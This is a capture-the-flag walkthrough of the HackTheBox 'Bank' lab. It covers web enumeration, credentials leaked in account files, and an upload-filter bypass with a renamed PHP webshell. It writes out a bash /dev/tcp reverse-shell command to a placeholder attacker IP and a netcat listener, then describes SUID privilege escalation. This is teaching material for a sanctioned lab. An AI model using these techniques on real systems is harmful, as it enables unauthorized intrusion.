## **Welcome!**

Today, we will cover the "Bank" machine from **HackTheBox**, a CTF rated as easy by the platform, even though most of the community rated it as medium. Let’s see!

![image](/HTB/Bank/Bank_images/1.png)

## Information Gathering

We can start with an aggressive **Nmap** scan to discover as much information as possible:

![image](/HTB/Bank/Bank_images/2.png)

We can identify three services running on the target host:

**SSH (22)**

**DNS (53)**

**HTTP (80)**

The website seems to host on its root a login panel. After trying some common credentials and **SQL Injection Bypass** techniques, we can’t directly log in to any specific dashboard. Never mind—we will launch a brute force attack against the web server in order to discover additional directories. To do this, we will use **Gobuster**:

![image](/HTB/Bank/Bank_images/3.png)

There is nothing else we can access… we can use a larger wordlist (it may take a moment):

![image](/HTB/Bank/Bank_images/4.png)

Indeed we find a lot of stuff now ! The uploads directory returns a 403 code (forbidden) when we access it and the inc directory is not very interesting. However, the balance-transfer directory is intriguing. Let’s check its contents:

![image](/HTB/Bank/Bank_images/5.png)

We have a lot of `.acc` files here. They seem to be account files, but what do they contain?

![image](/HTB/Bank/Bank_images/6.png)

Interesting, we can find an Email and a Password field with encoded data. This can be useful for us as we have a login panel. But the web directory hosts a huge number of files, how do we know which is the correct one ? Furthermore, we do not have any key to decrypt the strings 

We can filter the files by size on the web page, clicking on the “Size” Button. Maybe the largest or smallest file is the expected one.

![image](/HTB/Bank/Bank_images/7.png)

We can find a file that seems to be unique ! Let’s check it:

![image](/HTB/Bank/Bank_images/8.png)

And we found cleartext credentials! We should probably use them against the login panel in order to get authenticated:

![image](/HTB/Bank/Bank_images/9.png)

![image](/HTB/Bank/Bank_images/10.png)

## Initial Access

We now have access to a dashboard. Let’s navigate around:

![image](/HTB/Bank/Bank_images/11.png)

There is a support page that allows us to upload some files… Let’s see if we can upload a webshell directly on the webserver:

![image](/HTB/Bank/Bank_images/12.png)

It didn’t work. After further enumeration, we can learn via the source code of the page that a particular extension was allowed for debugging purposes:

![image](/HTB/Bank/Bank_images/13.png)

Can we leverage this to bypass the restriction? We will confirm this by copying `webshell.php` and renaming it to `webshell.htb`. Then we will try to upload it:

![image](/HTB/Bank/Bank_images/14.png)

What happens if we try to interact with it?

![image](/HTB/Bank/Bank_images/15.png)

It works! Let’s get a reverse shell via the following command:

`bash -i >& /dev/tcp/YOUR_IP/LISTENING_PORT 0>&1`

(ensure that you have a netcat listener running via `nc -lvnp <PORT>` in the background)

![image](/HTB/Bank/Bank_images/16.png)

We obtained our initial access! We can upgrade/stabilize our shell with the following command:

`python3 -c ‘import pty; pty.spawn(”/bin/bash”)’` 

(run `export TERM=xterm` in order to make the clear command able to work again)

![image](/HTB/Bank/Bank_images/17.png)

We are able to retrieve the first flag as we have permission to navigate to the `/home/chris` directory, which hosts `user.txt`.

![image](/HTB/Bank/Bank_images/18.png)

## Privilege Escalation

Let’s enumerate the system locally to find a way to escalate privileges. Running `sudo -l` leads us to enter a password, which is common as we have a unprivileged session. There are no cron jobs running in the background. However, there is an interesting uncommon binary that has a root SUID bit set on it:

![image](/HTB/Bank/Bank_images/19.png)

This means that we are able to execute the `emergency` with the owner’s permission, in this case we run it as root. Let’s execute it to see what happens:

![image](/HTB/Bank/Bank_images/20.png)

And that’s it! We gained full access to the machine and are able to retrieve the remaining `root.txt` flag:

![image](/HTB/Bank/Bank_images/21.png)

## Conclusion

This was an interesting room, and like previous times, the initial access was quite challenging as we had to find various solutions to solve issues during the enumeration phase or during the exploitation phase in which we had to look carefully to the source code to find the solution against the upload restriction. But again, the post-exploitation phase was fairly easy, and we didn’t need to perform a huge enumeration on the target, just the fundamental commands such `sudo -l`, `cat /etc/crontab`, `find / -type f -perm -04000 2>/dev/null`,…

**Thank you for reading !**
